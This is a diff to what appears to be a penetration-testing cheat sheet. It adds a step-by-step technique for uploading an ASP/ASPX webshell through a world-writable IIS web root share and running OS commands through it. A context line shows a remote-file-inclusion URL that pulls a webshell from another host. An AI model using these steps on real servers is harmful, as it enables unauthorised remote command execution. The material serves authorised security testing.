@@ -330,6 +330,21 @@ Example
 	  - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
 ```
 
+
+##### Technique 8 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
+
+```
+Example
+➤ Step 1. Identify a file share of a Web server that is insecurely granting read & write permissions to all "Domain Users" over the folder 'C:\inetpub\wwwroot\'
+
+➤ Step 2. Upload a webshell (.ASP or ASPX) in the folder 'C:\inetpub\wwwroot\' or 'C:\inetpub\wwwroot\application-name\'
+
+➤ Step 3. Browse your webshell and execute OS commands 
+          Examples:
+          - "http://x.x.x.x/Webshell.asp" 
+          - "http://x.x.x.x/application-name/Webshell.aspx" 
+```
+
 ##### Other - List of common path for the DocumentRoot directory (Web root folder)
 ```
 ➤ XAMP (Windows) = "c:\XAMPP\htdocs"
